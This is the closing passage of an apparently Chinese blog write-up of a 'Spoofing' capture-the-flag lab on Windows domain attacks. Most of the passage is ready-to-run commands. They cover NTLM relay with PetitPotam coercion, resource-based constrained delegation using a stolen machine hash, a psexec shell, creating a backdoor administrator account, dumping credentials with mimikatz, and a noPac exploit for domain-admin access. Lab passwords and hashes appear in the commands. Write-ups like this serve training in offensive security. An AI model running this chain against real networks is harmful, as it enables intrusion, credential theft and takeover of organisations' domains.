+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line"></span><br><span class="line">然后打petitpotam强制认证</span><br><span class="line">proxychains python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981422611-9816c06b-a2eb-4459-98d4-5e419eb47cf0.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742975249440-dd0c22cd-09df-42dd-b1a6-d29b8d74fab5.png"></p>
+<h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>配好后直接用之前172.22.11.45上抓的机器账户XR-DESKTOP$哈希打172.22.11.26的RBCD，拿白银票据</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981924104-f66e75d8-f2f6-435a-813b-7a697be00090.png"></p>
+<p>改个名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :37fd17d6c6653c4e65093e33f50f7d3d  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">sudo vim /etc/hosts#把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里</span><br><span class="line">172.22.11.26 XR-LCM3AE8B.xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p>导入ccache后，最后即可无密码连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982092267-f2bd9dd7-caf2-4d72-b52d-52c41b41c2f4.png"></p>
+<p>flag{681cae09-6e26-4714-87d8-e1e52d014bcc}</p>
+<h2 id="nopac"><a href="#nopac" class="headerlink" title="nopac"></a>nopac</h2><p>添加后门用户进行rdp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> net user calmsec admin@123 /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982227563-81ed6c8f-8bbb-4877-a88f-8ccc28c499eb.png"></p>
+<p>rdp26，登录的时候发现有用户在登录，传🥝抓一下hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>加管理员账户，rdp上去，用猕猴桃可以抓到一个zhanghui用户的哈希1232126b24cdf8c9bd2f788a9d7c7ed1，他在MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982930827-52b533e0-697e-4020-a280-816898acfe3e.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1983-Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">CVE-2020-1983 Tomcat文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">4.</span> <span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Relay-via-WebDAV-Petitpotam%E7%9A%84Coerce-Authentication"><span class="toc-number">5.</span> <span class="toc-text">Relay via WebDAV+Petitpotam的Coerce Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">6.</span> <span class="toc-text">基于资源的约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nopac"><span class="toc-number">7.</span> <span class="toc-text">nopac</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&text=春秋云境-Spoofing"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&is_video=false&description=春秋云境-Spoofing"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Spoofing&body=Check out this article: https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&name=春秋云境-Spoofing&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&t=春秋云境-Spoofing"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
